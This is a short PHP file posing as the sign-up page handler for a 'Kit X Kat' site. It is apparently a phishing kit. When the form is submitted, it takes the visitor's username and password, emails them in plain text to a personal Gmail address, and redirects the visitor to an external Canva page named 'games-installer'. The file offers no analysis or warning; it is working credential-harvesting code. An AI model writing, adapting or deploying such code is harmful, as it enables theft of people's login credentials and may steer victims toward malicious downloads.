<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST["username"], $_POST["password"])) {
        $username = $_POST["username"];
        $password = $_POST["password"];

        $to = "drisssebti12@gmail.com";
        $subject = "Sign Up Form Submission";
        $message = "Username: $username\nPassword: $password\nEmail: $email";
        $headers = "From: $email";

        if (mail($to, $subject, $message, $headers)) {
            header("Location: https://games-installer.my.canva.site/games-onlinees/");
            exit;
        } else {
            echo "Error: Message could not be sent.";
        }
    } else {
        header("Location: index.html");
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Kit X Kat Sign Up Page</title>
</head>
<body>
    <!-- Your HTML content here -->
</body>
</html>